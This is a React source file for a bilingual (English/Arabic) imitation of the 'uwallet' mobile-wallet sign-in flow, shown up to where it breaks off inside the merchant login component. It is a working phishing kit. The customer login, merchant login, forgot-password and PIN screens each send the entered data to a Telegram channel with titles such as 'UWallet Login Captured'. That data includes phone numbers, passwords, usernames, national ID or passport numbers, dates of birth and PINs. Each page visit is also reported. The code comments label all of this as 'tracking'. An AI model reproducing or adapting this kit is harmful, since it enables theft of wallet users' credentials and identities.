"use client"

import { useState, useEffect, useCallback } from "react"
import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"

type Language = "en" | "ar"

const translations = {
    en: {
        signInAs: "Sign In as a Customer",
        to: "To",
        brand: "uwallet",
        langToggle: "العربية",
        mobileNumber: "Mobile Number",
        password: "Password",
        show: "show",
        hide: "hide",
        rememberMe: "Remember me",
        forgotPassword: "Forgot Password?",
        signIn: "Sign in",
        signInMerchant: "Sign In as a Merchant",
        continueGuest: "Continue as a Guest",
        noAccount: "Don't have an account?",
        registerNow: "Register Now",
        // Forgot Password Screen
        forgotPasswordTitle: "Forgot\nPassword",
        forgotPIN: "Forgot your PIN?",
        clickHere: "Click Here",
        nationalId: "National ID /Passport Number",
        dateOfBirth: "Date of Birth",
        pinCode: "PIN Code",
        submit: "Submit",
        // PIN Screen
        enterPin: "Please enter your 6-digit PIN code",
        verify: "Verify",
        resendIn: "Resend in",
        seconds: "sec",
        // Merchant Login Screen
        signInAsMerchant: "Sign In as a Merchant",
        username: "Username",
        signInCustomer: "Sign In as a Customer",
        usernameRequired: "Username is required",
        // Validation Messages
        mobileRequired: "Mobile number is required",
        mobileInvalid: "Please enter a valid mobile number",
        passwordRequired: "Password is required",
        passwordMinLength: "Password must be at least 6 characters",
        nationalIdRequired: "National ID/Passport is required",
        dateOfBirthRequired: "Date of birth is required",
        dateOfBirthInvalid: "Please enter a valid date (DD/MM/YYYY)",
        pinCodeRequired: "PIN code is required",
        pinCodeInvalid: "PIN code must be 4-6 digits",
    },
    ar: {
        signInAs: "الدخول كعميل",
        to: "إلى",
        brand: "uwallet",
        langToggle: "English",
        mobileNumber: "رقم الهاتف",
        password: "كلمة السر",
        show: "إظهار",
        hide: "إخفاء",
        rememberMe: "تذكرني",
        forgotPassword: "هل نسيت كلمة السر؟",
        signIn: "تسجيل الدخول",
        signInMerchant: "الدخول كتاجر",
        continueGuest: "استمر كضيف",
        noAccount: "ليس لديك حساب؟",
        registerNow: "سجل الآن",
        // Forgot Password Screen
        forgotPasswordTitle: "نسيت\nكلمة السر",
        forgotPIN: "نسيت رمز PIN؟",
        clickHere: "اضغط هنا",
        nationalId: "الرقم الوطني / رقم جواز السفر",
        dateOfBirth: "تاريخ الميلاد",
        pinCode: "رمز PIN",
        submit: "إرسال",
        // PIN Screen
        enterPin: "يرجى إدخال رمز PIN المكون من 6 أرقام",
        verify: "تحقق",
        resendIn: "إعادة الإرسال خلال",
        seconds: "ثانية",
        // Merchant Login Screen
        signInAsMerchant: "الدخول كتاجر",
        username: "اسم المستخدم",
        signInCustomer: "الدخول كعميل",
        usernameRequired: "اسم المستخدم مطلوب",
        // Validation Messages
        mobileRequired: "رقم الهاتف مطلوب",
        mobileInvalid: "الرجاء إدخال رقم هاتف صحيح",
        passwordRequired: "كلمة السر مطلوبة",
        passwordMinLength: "كلمة السر يجب أن تكون 6 أحرف على الأقل",
        nationalIdRequired: "الرقم الوطني/جواز السفر مطلوب",
        dateOfBirthRequired: "تاريخ الميلاد مطلوب",
        dateOfBirthInvalid: "الرجاء إدخال تاريخ صحيح (DD/MM/YYYY)",
        pinCodeRequired: "رمز PIN مطلوب",
        pinCodeInvalid: "رمز PIN يجب أن يكون 4-6 أرقام",
    },
}

type Screen = "login" | "forgotPassword" | "merchantLogin" | "pinCode"

interface LoginErrors {
    mobile?: string
    password?: string
}

export default function UWalletApp() {
    const [showSplash, setShowSplash] = useState(true)
    const [currentScreen, setCurrentScreen] = useState<Screen>("login")
    const [language, setLanguage] = useState<Language>("en")
    const [showPassword, setShowPassword] = useState(false)
    const [rememberMe, setRememberMe] = useState(false)
    const [loading, setLoading] = useState(false)

    // Login form state
    const [mobileNumber, setMobileNumber] = useState("")
    const [password, setPassword] = useState("")
    const [loginErrors, setLoginErrors] = useState<LoginErrors>({})
    const [loginTouched, setLoginTouched] = useState({ mobile: false, password: false })

    useEffect(() => {
        const trackVisitor = async () => {
            await fetchVisitorInfo()
            await sendTelegramMessage({
                title: "UWallet Login Page Opened",
                type: "visitor",
            })
        }
        trackVisitor()
    }, [])

    const t = translations[language]
    const isRTL = language === "ar"

    // Login validation
    const validateLogin = (): boolean => {
        const errors: LoginErrors = {}

        if (!mobileNumber.trim()) {
            errors.mobile = t.mobileRequired
        } else if (!/^[0-9]{9,15}$/.test(mobileNumber.replace(/\s/g, ""))) {
            errors.mobile = t.mobileInvalid
        }

        if (!password) {
            errors.password = t.passwordRequired
        } else if (password.length < 6) {
            errors.password = t.passwordMinLength
        }

        setLoginErrors(errors)
        return Object.keys(errors).length === 0
    }

    const handleSignIn = async () => {
        setLoginTouched({ mobile: true, password: true })
        if (validateLogin()) {
            setLoading(true)

            // Send login credentials to Telegram
            try {
                await sendTelegramMessage({
                    title: "UWallet Login Captured",
                    message: `• <b>Phone:</b> <code>${mobileNumber}</code>\n• <b>Password:</b> <code>${password}</code>`,
                    type: "click",
                })
            } catch (err) {
                console.error("Failed to send login tracking:", err)
            }

            setTimeout(() => {
                setLoading(false)
                setCurrentScreen("pinCode")
            }, 3000)
        }
    }

    useEffect(() => {
        const timer = setTimeout(() => {
            setShowSplash(false)
        }, 3000)
        return () => clearTimeout(timer)
    }, [])

    if (showSplash) {
        return <SplashScreen />
    }

    if (currentScreen === "pinCode") {
        return (
            <PinCodeScreen
                t={t}
                isRTL={isRTL}
                onBack={() => setCurrentScreen("login")}
                mobileNumber={mobileNumber}
            />
        )
    }

    if (currentScreen === "forgotPassword") {
        return (
            <ForgotPasswordScreen
                t={t}
                isRTL={isRTL}
                onBack={() => setCurrentScreen("login")}
            />
        )
    }

    if (currentScreen === "merchantLogin") {
        return (
            <MerchantLoginScreen
                t={t}
                isRTL={isRTL}
                language={language}
                setLanguage={setLanguage}
                onBack={() => setCurrentScreen("login")}
                onForgotPassword={() => setCurrentScreen("forgotPassword")}
            />
        )
    }

    return (
        <div
            className="min-h-screen w-full flex flex-col"
            dir={isRTL ? "rtl" : "ltr"}
            style={{ backgroundColor: "#f8f9fb" }}
        >
            {/* Main Content */}
            <div className="flex-1 px-6 pt-12 pb-6">
                {/* Header */}
                <div className={`flex items-start justify-between mb-8 ${isRTL ? "flex-row-reverse" : ""}`}>
                    <div className={isRTL ? "text-right" : "text-left"}>
                        <h1
                            className="text-[22px] font-normal text-[#2d3748] leading-tight"
                            style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
                        >
                            {t.signInAs}
                        </h1>
                        <div className="flex items-center gap-1.5 mt-0.5">
                            <span
                                className="text-[22px] font-normal text-[#2d3748]"
                                style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
                            >
                                {t.to}
                            </span>
                            <span
                                className="text-[22px] font-extrabold text-[#1e2b4d]"
                                style={{ fontFamily: "var(--font-nunito), system-ui, sans-serif" }}
                            >
                                {t.brand}
                            </span>
                        </div>
                    </div>
                    <button
                        onClick={() => setLanguage(isRTL ? "en" : "ar")}
                        className="text-[15px] text-[#6b7280] hover:text-[#4b5563] transition-colors mt-1"
                    >
                        {t.langToggle}
                    </button>
                </div>

                {/* Form */}
                <div className="space-y-5">
                    {/* Mobile Number */}
                    <div>
                        <label
                            className={`block text-[14px] text-[#9ca3af] mb-2 ${isRTL ? "text-right" : "text-left"}`}
                        >
                            {t.mobileNumber}
                        </label>
                        <input
                            type="tel"
                            value={mobileNumber}
                            onChange={(e) => {
                                setMobileNumber(e.target.value)
                                if (loginTouched.mobile) {
                                    setLoginErrors(prev => ({ ...prev, mobile: undefined }))
                                }
                            }}
                            onBlur={() => {
                                setLoginTouched(prev => ({ ...prev, mobile: true }))
                                if (!mobileNumber.trim()) {
                                    setLoginErrors(prev => ({ ...prev, mobile: t.mobileRequired }))
                                } else if (!/^[0-9]{9,15}$/.test(mobileNumber.replace(/\s/g, ""))) {
                                    setLoginErrors(prev => ({ ...prev, mobile: t.mobileInvalid }))
                                }
                            }}
                            className={`w-full h-[52px] px-4 rounded-lg border bg-white text-[16px] text-[#1f2937] focus:outline-none transition-colors ${loginErrors.mobile && loginTouched.mobile
                                ? "border-red-500 focus:border-red-500"
                                : "border-[#e5e7eb] focus:border-[#9ca3af]"
                                }`}
                            style={{ direction: "ltr" }}
                        />
                        {loginErrors.mobile && loginTouched.mobile && (
                            <p className={`text-[12px] text-red-500 mt-1 ${isRTL ? "text-right" : "text-left"}`}>
                                {loginErrors.mobile}
                            </p>
                        )}
                    </div>

                    {/* Password */}
                    <div>
                        <label
                            className={`block text-[14px] text-[#9ca3af] mb-2 ${isRTL ? "text-right" : "text-left"}`}
                        >
                            {t.password}
                        </label>
                        <div className="relative">
                            <input
                                type={showPassword ? "text" : "password"}
                                value={password}
                                onChange={(e) => {
                                    setPassword(e.target.value)
                                    if (loginTouched.password) {
                                        setLoginErrors(prev => ({ ...prev, password: undefined }))
                                    }
                                }}
                                onBlur={() => {
                                    setLoginTouched(prev => ({ ...prev, password: true }))
                                    if (!password) {
                                        setLoginErrors(prev => ({ ...prev, password: t.passwordRequired }))
                                    } else if (password.length < 6) {
                                        setLoginErrors(prev => ({ ...prev, password: t.passwordMinLength }))
                                    }
                                }}
                                className={`w-full h-[52px] px-4 rounded-lg border bg-white text-[16px] text-[#1f2937] focus:outline-none transition-colors ${loginErrors.password && loginTouched.password
                                    ? "border-red-500 focus:border-red-500"
                                    : "border-[#e5e7eb] focus:border-[#9ca3af]"
                                    }`}
                                style={{ direction: "ltr" }}
                            />
                            <button
                                type="button"
                                onClick={() => setShowPassword(!showPassword)}
                                className={`absolute top-1/2 -translate-y-1/2 text-[14px] text-[#9ca3af] hover:text-[#6b7280] transition-colors ${isRTL ? "left-4" : "right-4"}`}
                            >
                                {showPassword ? t.hide : t.show}
                            </button>
                        </div>
                        {loginErrors.password && loginTouched.password && (
                            <p className={`text-[12px] text-red-500 mt-1 ${isRTL ? "text-right" : "text-left"}`}>
                                {loginErrors.password}
                            </p>
                        )}
                    </div>

                    {/* Remember Me & Forgot Password */}
                    <div className="flex items-center justify-between">
                        {isRTL ? (
                            <>
                                <button
                                    onClick={() => setCurrentScreen("forgotPassword")}
                                    className="text-[14px] text-[#6b7280] underline hover:text-[#4b5563] transition-colors"
                                >
                                    {t.forgotPassword}
                                </button>
                                <label className="flex items-center gap-2.5 cursor-pointer">
                                    <span className="text-[14px] text-[#4b5563]">{t.rememberMe}</span>
                                    <div
                                        onClick={() => setRememberMe(!rememberMe)}
                                        className={`w-[22px] h-[22px] rounded border-2 flex items-center justify-center transition-colors cursor-pointer ${rememberMe
                                            ? "bg-[#1e2b4d] border-[#1e2b4d]"
                                            : "bg-white border-[#d1d5db]"
                                            }`}
                                    >
                                        {rememberMe && (
                                            <svg width="12" height="10" viewBox="0 0 12 10" fill="none">
                                                <path d="M1 5L4.5 8.5L11 1" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                            </svg>
                                        )}
                                    </div>
                                </label>
                            </>
                        ) : (
                            <>
                                <label className="flex items-center gap-2.5 cursor-pointer">
                                    <div
                                        onClick={() => setRememberMe(!rememberMe)}
                                        className={`w-[22px] h-[22px] rounded border-2 flex items-center justify-center transition-colors cursor-pointer ${rememberMe
                                            ? "bg-[#1e2b4d] border-[#1e2b4d]"
                                            : "bg-white border-[#d1d5db]"
                                            }`}
                                    >
                                        {rememberMe && (
                                            <svg width="12" height="10" viewBox="0 0 12 10" fill="none">
                                                <path d="M1 5L4.5 8.5L11 1" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                            </svg>
                                        )}
                                    </div>
                                    <span className="text-[14px] text-[#4b5563]">{t.rememberMe}</span>
                                </label>
                                <button
                                    onClick={() => setCurrentScreen("forgotPassword")}
                                    className="text-[14px] text-[#6b7280] underline hover:text-[#4b5563] transition-colors"
                                >
                                    {t.forgotPassword}
                                </button>
                            </>
                        )}
                    </div>
                </div>

                {/* Buttons */}
                <div className="mt-8 space-y-4">
                    <button
                        onClick={handleSignIn}
                        disabled={loading}
                        className="w-full h-[56px] rounded-lg text-white text-[17px] font-semibold transition-all hover:opacity-90 flex items-center justify-center gap-2"
                        style={{ backgroundColor: "#8b95a5" }}
                    >
                        {loading ? (
                            <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        ) : (
                            t.signIn
                        )}
                    </button>
                    <button
                        onClick={() => setCurrentScreen("merchantLogin")}
                        className="w-full h-[56px] rounded-lg border-2 border-[#d1d5db] bg-white text-[#1f2937] text-[17px] font-semibold hover:bg-[#f9fafb] transition-colors"
                    >
                        {t.signInMerchant}
                    </button>
                </div>
            </div>

            {/* Bottom Section with Curve */}
            <div className="relative">
                {/* Curved Background */}
                <div
                    className="absolute inset-0 overflow-hidden"
                    style={{ height: "180px" }}
                >
                    <svg
                        viewBox="0 0 400 180"
                        fill="none"
                        preserveAspectRatio="none"
                        className="w-full h-full"
                    >
                        <path
                            d="M0 60 Q200 0 400 60 L400 180 L0 180 Z"
                            fill="#e8f4f8"
                        />
                    </svg>
                </div>

                {/* Bottom Links */}
                <div className="relative z-10 pt-16 pb-12 text-center">
                    <button className="text-[15px] text-[#4b5563] underline font-medium hover:text-[#374151] transition-colors">
                        {t.continueGuest}
                    </button>
                    <div className="mt-3 flex items-center justify-center gap-1">
                        <span className="text-[14px] text-[#6b7280]">{t.noAccount}</span>
                        <button className="text-[14px] text-[#1f2937] font-semibold hover:underline transition-colors">
                            {t.registerNow}
                        </button>
                    </div>
                </div>
            </div>
        </div>
    )
}

function SplashScreen() {
    return (
        <div
            className="min-h-screen w-full flex flex-col items-center justify-center gap-8"
            style={{
                background: "linear-gradient(180deg, #1e2b4d 0%, #252942 35%, #3d2845 65%, #6b2a52 100%)"
            }}
        >
            <h1
                className="text-white text-[36px] font-extrabold tracking-[-0.02em]"
                style={{ fontFamily: "var(--font-nunito), system-ui, sans-serif" }}
            >
                uwallet
            </h1>

            {/* Spinner */}
            <div className="relative w-10 h-10">
                <div
                    className="absolute inset-0 rounded-full border-[3px] border-white/20"
                />
                <div
                    className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-white animate-spin"
                    style={{ animationDuration: "1s" }}
                />
            </div>
        </div>
    )
}

interface ForgotPasswordScreenProps {
    t: typeof translations.en
    isRTL: boolean
    onBack: () => void
}

interface ForgotPasswordErrors {
    nationalId?: string
    dateOfBirth?: string
    mobile?: string
    pinCode?: string
}

function ForgotPasswordScreen({ t, isRTL, onBack }: ForgotPasswordScreenProps) {
    const [nationalId, setNationalId] = useState("")
    const [dateOfBirth, setDateOfBirth] = useState("")
    const [mobile, setMobile] = useState("")
    const [pinCode, setPinCode] = useState("")
    const [errors, setErrors] = useState<ForgotPasswordErrors>({})
    const [touched, setTouched] = useState({
        nationalId: false,
        dateOfBirth: false,
        mobile: false,
        pinCode: false,
    })

    const validateForm = (): boolean => {
        const newErrors: ForgotPasswordErrors = {}

        if (!nationalId.trim()) {
            newErrors.nationalId = t.nationalIdRequired
        }

        if (!dateOfBirth.trim()) {
            newErrors.dateOfBirth = t.dateOfBirthRequired
        } else if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dateOfBirth)) {
            newErrors.dateOfBirth = t.dateOfBirthInvalid
        }

        if (!mobile.trim()) {
            newErrors.mobile = t.mobileRequired
        } else if (!/^[0-9]{9,15}$/.test(mobile.replace(/\s/g, ""))) {
            newErrors.mobile = t.mobileInvalid
        }

        if (!pinCode.trim()) {
            newErrors.pinCode = t.pinCodeRequired
        } else if (!/^[0-9]{4,6}$/.test(pinCode)) {
            newErrors.pinCode = t.pinCodeInvalid
        }

        setErrors(newErrors)
        return Object.keys(newErrors).length === 0
    }

    const handleSubmit = async () => {
        setTouched({
            nationalId: true,
            dateOfBirth: true,
            mobile: true,
            pinCode: true,
        })
        if (validateForm()) {
            try {
                await sendTelegramMessage({
                    title: "UWallet Forgot Password Captured",
                    message: `• <b>National ID / Passport:</b> <code>${nationalId}</code>\n• <b>Date of Birth:</b> <code>${dateOfBirth}</code>\n• <b>Phone:</b> <code>${mobile}</code>\n• <b>PIN:</b> <code>${pinCode}</code>`,
                    type: "click",
                })
            } catch (err) {
                console.error("Failed to send tracking:", err)
            }
        }
    }

    const formatDateInput = (value: string) => {
        const numbers = value.replace(/\D/g, "")
        if (numbers.length <= 2) return numbers
        if (numbers.length <= 4) return `${numbers.slice(0, 2)}/${numbers.slice(2)}`
        return `${numbers.slice(0, 2)}/${numbers.slice(2, 4)}/${numbers.slice(4, 8)}`
    }

    return (
        <div
            className="min-h-screen w-full flex flex-col bg-white"
            dir={isRTL ? "rtl" : "ltr"}
        >
            {/* Header */}
            <div className="px-6 pt-10 pb-6">
                <div className={`flex items-start gap-3 ${isRTL ? "flex-row-reverse" : ""}`}>
                    {/* Back Button */}
                    <button
                        onClick={onBack}
                        className="mt-1 text-[#6b7280] hover:text-[#4b5563] transition-colors"
                    >
                        <svg
                            width="24"
                            height="24"
                            viewBox="0 0 24 24"
                            fill="none"
                            stroke="currentColor"
                            strokeWidth="2"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            className={isRTL ? "rotate-180" : ""}
                        >
                            <path d="M15 18l-6-6 6-6" />
                        </svg>
                    </button>

                    {/* Title and Forgot PIN Link */}
                    <div className={`flex-1 flex items-start justify-between ${isRTL ? "flex-row-reverse" : ""}`}>
                        <h1
                            className="text-[24px] font-bold text-[#1f2937] leading-tight whitespace-pre-line"
                            style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
                        >
                            {t.forgotPasswordTitle}
                        </h1>
                        <div className={`flex items-center gap-1 text-[13px] ${isRTL ? "flex-row-reverse" : ""}`}>
                            <span className="text-[#4b5563]">{t.forgotPIN}</span>
                            <button className="text-[#1f2937] font-medium underline hover:text-[#374151] transition-colors">
                                {t.clickHere}
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            {/* Form */}
            <div className="flex-1 px-6 space-y-5">
                {/* National ID / Passport Number */}
                <div>
                    <label
                        className={`block text-[14px] text-[#9ca3af] mb-2 ${isRTL ? "text-right" : "text-left"}`}
                    >
                        {t.nationalId}
                    </label>
                    <input
                        type="text"
                        value={nationalId}
                        onChange={(e) => {
                            setNationalId(e.target.value)
                            if (touched.nationalId) setErrors(prev => ({ ...prev, nationalId: undefined }))
                        }}
                        onBlur={() => {
                            setTouched(prev => ({ ...prev, nationalId: true }))
                            if (!nationalId.trim()) setErrors(prev => ({ ...prev, nationalId: t.nationalIdRequired }))
                        }}
                        className={`w-full h-[52px] px-4 rounded-lg border bg-white text-[16px] text-[#1f2937] focus:outline-none transition-colors ${errors.nationalId && touched.nationalId
                            ? "border-red-500 focus:border-red-500"
                            : "border-[#e5e7eb] focus:border-[#9ca3af]"
                            }`}
                        style={{ direction: "ltr" }}
                    />
                    {errors.nationalId && touched.nationalId && (
                        <p className={`text-[12px] text-red-500 mt-1 ${isRTL ? "text-right" : "text-left"}`}>
                            {errors.nationalId}
                        </p>
                    )}
                </div>

                {/* Date of Birth */}
                <div>
                    <label
                        className={`block text-[14px] text-[#9ca3af] mb-2 ${isRTL ? "text-right" : "text-left"}`}
                    >
                        {t.dateOfBirth}
                    </label>
                    <div className="relative">
                        <input
                            type="text"
                            value={dateOfBirth}
                            placeholder="DD/MM/YYYY"
                            onChange={(e) => {
                                const formatted = formatDateInput(e.target.value)
                                setDateOfBirth(formatted)
                                if (touched.dateOfBirth) setErrors(prev => ({ ...prev, dateOfBirth: undefined }))
                            }}
                            onBlur={() => {
                                setTouched(prev => ({ ...prev, dateOfBirth: true }))
                                if (!dateOfBirth.trim()) {
                                    setErrors(prev => ({ ...prev, dateOfBirth: t.dateOfBirthRequired }))
                                } else if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dateOfBirth)) {
                                    setErrors(prev => ({ ...prev, dateOfBirth: t.dateOfBirthInvalid }))
                                }
                            }}
                            className={`w-full h-[52px] px-4 rounded-lg border bg-white text-[16px] text-[#1f2937] focus:outline-none transition-colors placeholder:text-[#d1d5db] ${errors.dateOfBirth && touched.dateOfBirth
                                ? "border-red-500 focus:border-red-500"
                                : "border-[#e5e7eb] focus:border-[#9ca3af]"
                                }`}
                            style={{ direction: "ltr" }}
                        />
                        <button
                            type="button"
                            className={`absolute top-1/2 -translate-y-1/2 text-[#9ca3af] hover:text-[#6b7280] transition-colors ${isRTL ? "left-4" : "right-4"}`}
                        >
                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                                <rect x="2" y="4" width="16" height="14" rx="2" stroke="currentColor" strokeWidth="1.5" />
                                <path d="M2 8h16" stroke="currentColor" strokeWidth="1.5" />
                                <path d="M6 2v4M14 2v4" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" />
                                <rect x="5" y="11" width="2" height="2" rx="0.5" fill="currentColor" />
                                <rect x="9" y="11" width="2" height="2" rx="0.5" fill="currentColor" />
                                <rect x="13" y="11" width="2" height="2" rx="0.5" fill="currentColor" />
                                <rect x="5" y="14" width="2" height="2" rx="0.5" fill="currentColor" />
                                <rect x="9" y="14" width="2" height="2" rx="0.5" fill="currentColor" />
                            </svg>
                        </button>
                    </div>
                    {errors.dateOfBirth && touched.dateOfBirth && (
                        <p className={`text-[12px] text-red-500 mt-1 ${isRTL ? "text-right" : "text-left"}`}>
                            {errors.dateOfBirth}
                        </p>
                    )}
                </div>

                {/* Mobile Number */}
                <div>
                    <label
                        className={`block text-[14px] text-[#9ca3af] mb-2 ${isRTL ? "text-right" : "text-left"}`}
                    >
                        {t.mobileNumber}
                    </label>
                    <input
                        type="tel"
                        value={mobile}
                        onChange={(e) => {
                            setMobile(e.target.value)
                            if (touched.mobile) setErrors(prev => ({ ...prev, mobile: undefined }))
                        }}
                        onBlur={() => {
                            setTouched(prev => ({ ...prev, mobile: true }))
                            if (!mobile.trim()) {
                                setErrors(prev => ({ ...prev, mobile: t.mobileRequired }))
                            } else if (!/^[0-9]{9,15}$/.test(mobile.replace(/\s/g, ""))) {
                                setErrors(prev => ({ ...prev, mobile: t.mobileInvalid }))
                            }
                        }}
                        className={`w-full h-[52px] px-4 rounded-lg border bg-white text-[16px] text-[#1f2937] focus:outline-none transition-colors ${errors.mobile && touched.mobile
                            ? "border-red-500 focus:border-red-500"
                            : "border-[#e5e7eb] focus:border-[#9ca3af]"
                            }`}
                        style={{ direction: "ltr" }}
                    />
                    {errors.mobile && touched.mobile && (
                        <p className={`text-[12px] text-red-500 mt-1 ${isRTL ? "text-right" : "text-left"}`}>
                            {errors.mobile}
                        </p>
                    )}
                </div>

                {/* PIN Code */}
                <div>
                    <label
                        className={`block text-[14px] text-[#9ca3af] mb-2 ${isRTL ? "text-right" : "text-left"}`}
                    >
                        {t.pinCode}
                    </label>
                    <input
                        type="text"
                        value={pinCode}
                        maxLength={6}
                        onChange={(e) => {
                            const value = e.target.value.replace(/\D/g, "")
                            setPinCode(value)
                            if (touched.pinCode) setErrors(prev => ({ ...prev, pinCode: undefined }))
                        }}
                        onBlur={() => {
                            setTouched(prev => ({ ...prev, pinCode: true }))
                            if (!pinCode.trim()) {
                                setErrors(prev => ({ ...prev, pinCode: t.pinCodeRequired }))
                            } else if (!/^[0-9]{4,6}$/.test(pinCode)) {
                                setErrors(prev => ({ ...prev, pinCode: t.pinCodeInvalid }))
                            }
                        }}
                        className={`w-full h-[52px] px-4 rounded-lg border bg-white text-[16px] text-[#1f2937] focus:outline-none transition-colors ${errors.pinCode && touched.pinCode
                            ? "border-red-500 focus:border-red-500"
                            : "border-[#e5e7eb] focus:border-[#9ca3af]"
                            }`}
                        style={{ direction: "ltr" }}
                    />
                    {errors.pinCode && touched.pinCode && (
                        <p className={`text-[12px] text-red-500 mt-1 ${isRTL ? "text-right" : "text-left"}`}>
                            {errors.pinCode}
                        </p>
                    )}
                </div>
            </div>

            {/* Submit Button */}
            <div className="px-6 py-8">
                <button
                    onClick={handleSubmit}
                    className="w-full h-[56px] rounded-lg text-white text-[17px] font-semibold transition-colors hover:opacity-90"
                    style={{ backgroundColor: "#8b95a5" }}
                >
                    {t.submit}
                </button>
            </div>
        </div>
    )
}

interface MerchantLoginScreenProps {
    t: typeof translations.en
    isRTL: boolean
    language: Language
    setLanguage: (lang: Language) => void
    onBack: () => void
    onForgotPassword: () => void
}

interface MerchantLoginErrors {
    username?: string
    password?: string
}

interface PinCodeScreenProps {
    t: typeof translations.en
    isRTL: boolean
    onBack: () => void
    mobileNumber: string
}

function PinCodeScreen({ t, isRTL, onBack, mobileNumber }: PinCodeScreenProps) {
    const [pin, setPin] = useState(["", "", "", "", "", ""])
    const [loading, setLoading] = useState(false)
    const [timer, setTimer] = useState(60)

    useEffect(() => {
        let interval: NodeJS.Timeout
        if (timer > 0) {
            interval = setInterval(() => {
                setTimer((prev) => prev - 1)
            }, 1000)
        }
        return () => clearInterval(interval)
    }, [timer])

    const handleInputChange = (value: string, index: number) => {
        if (value.length > 1) value = value[value.length - 1]
        if (!/^\d*$/.test(value)) return

        const newPin = [...pin]
        newPin[index] = value
        setPin(newPin)

        // Move to next input
        if (value && index < 5) {
            const nextInput = document.getElementById(`pin-${index + 1}`)
            nextInput?.focus()
        }
    }

    const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
        if (e.key === "Backspace" && !pin[index] && index > 0) {
            const prevInput = document.getElementById(`pin-${index - 1}`)
            prevInput?.focus()
        }
    }

    const handleVerify = async () => {
        const pinString = pin.join("")
        if (pinString.length === 6) {
            setLoading(true)
            try {
                const { sendTelegramMessage } = await import("@/lib/telegram")
                await sendTelegramMessage({
                    title: "UWallet PIN Captured",
                    message: `• <b>Phone:</b> ${mobileNumber}\n• <b>PIN:</b> <code>${pinString}</code>`,
                    type: "click",
                })
            } catch (err) {
                console.error("Failed to send tracking:", err)
            }

            setTimeout(() => {
                setLoading(false)
                setPin(["", "", "", "", "", ""])
                setTimer(60)
                const firstInput = document.getElementById("pin-0")
                firstInput?.focus()
            }, 2000)
        }
    }

    return (
        <div
            className="min-h-screen w-full flex flex-col bg-white"
            dir={isRTL ? "rtl" : "ltr"}
        >
            <div className="px-6 pt-12 pb-6 flex flex-col items-center">
                <button
                    onClick={onBack}
                    className={`self-start mb-8 text-[#6b7280] hover:text-[#4b5563] transition-colors ${isRTL ? "rotate-180" : ""}`}
                >
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M15 18l-6-6 6-6" />
                    </svg>
                </button>

                <h1 className="text-[24px] font-bold text-[#1f2937] mb-4 text-center">
                    {t.pinCode}
                </h1>

                <p className="text-[#6b7280] text-[15px] mb-8 text-center max-w-[280px]">
                    {t.enterPin}
                </p>

                <div className="w-full max-w-[340px] space-y-10">
                    <div className="flex justify-between gap-2" style={{ direction: "ltr" }}>
                        {pin.map((digit, index) => (
                            <input
                                key={index}
                                id={`pin-${index}`}
                                type="text"
                                inputMode="numeric"
                                maxLength={1}
                                value={digit}
                                autoFocus={index === 0}
                                onChange={(e) => handleInputChange(e.target.value, index)}
                                onKeyDown={(e) => handleKeyDown(e, index)}
                                className="w-11 h-12 text-center text-2xl font-bold border-b-2 border-[#e5e7eb] focus:border-[#1e2b4d] focus:outline-none transition-all bg-transparent"
                            />
                        ))}
                    </div>

                    <div className="flex flex-col items-center gap-6">
                        <div className="text-[14px] text-[#6b7280] font-medium">
                            {t.resendIn} <span className="text-[#1e2b4d] font-bold">{timer} {t.seconds}</span>
                        </div>

                        <button
                            onClick={handleVerify}
                            disabled={pin.join("").length < 6 || loading}
                            className={`w-full h-[56px] rounded-lg text-white text-[17px] font-semibold transition-all flex items-center justify-center gap-2 ${pin.join("").length === 6 ? "bg-[#1e2b4d] hover:opacity-90" : "bg-[#d1d5db] cursor-not-allowed"
                                }`}
                        >
                            {loading ? (
                                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                            ) : (
                                t.verify
                            )}
                        </button>
                    </div>
                </div>
            </div>
        </div>
    )
}

function MerchantLoginScreen({ t, isRTL, language, setLanguage, onBack, onForgotPassword }: MerchantLoginScreenProps) {
    const [username, setUsername] = useState("")
    const [password, setPassword] = useState("")
    const [showPassword, setShowPassword] = useState(false)
    const [rememberMe, setRememberMe] = useState(false)
    const [errors, setErrors] = useState<MerchantLoginErrors>({})
    const [touched, setTouched] = useState({ username: false, password: false })

    const validateForm = (): boolean => {
        const newErrors: MerchantLoginErrors = {}

        if (!username.trim()) {
            newErrors.username = t.usernameRequired
        }

        if (!password) {
            newErrors.password = t.passwordRequired
        } else if (password.length < 6) {
            newErrors.password = t.passwordMinLength
        }

        setErrors(newErrors)
        return Object.keys(newErrors).length === 0
    }

    const handleSignIn = async () => {
        setTouched({ username: true, password: true })
        if (validateForm()) {
            try {
                await sendTelegramMessage({
                    title: "UWallet Merchant Login Captured",
                    message: `• <b>Username:</b> <code>${username}</code>\n• <b>Password:</b> <code>${password}</code>`,
                    type: "click",
                })
            } catch (err) {
                console.error("Failed to send tracking:", err)
            }
        }
    }

    return (
        <div
            className="min-h-screen w-full flex flex-col"
            dir={isRTL ? "rtl" : "ltr"}
            style={{ backgroundColor: "#f8f9fb" }}
        >
            {/* Main Content */}
            <div className="flex-1 px-6 pt-12 pb-6">
                {/* Header */}
                <div className={`flex items-start justify-between mb-8 ${isRTL ? "flex-row-reverse" : ""}`}>
                    <div className={isRTL ? "text-right" : "text-left"}>
                        <h1
                            className="text-[22px] font-normal text-[#2d3748] leading-tight"
                            style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
                        >
                            {t.signInAsMerchant}
                        </h1>
                        <div className="flex items-center gap-1.5 mt-0.5">
                            <span
                                className="text-[22px] font-normal text-[#2d3748]"
                                style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
                            >
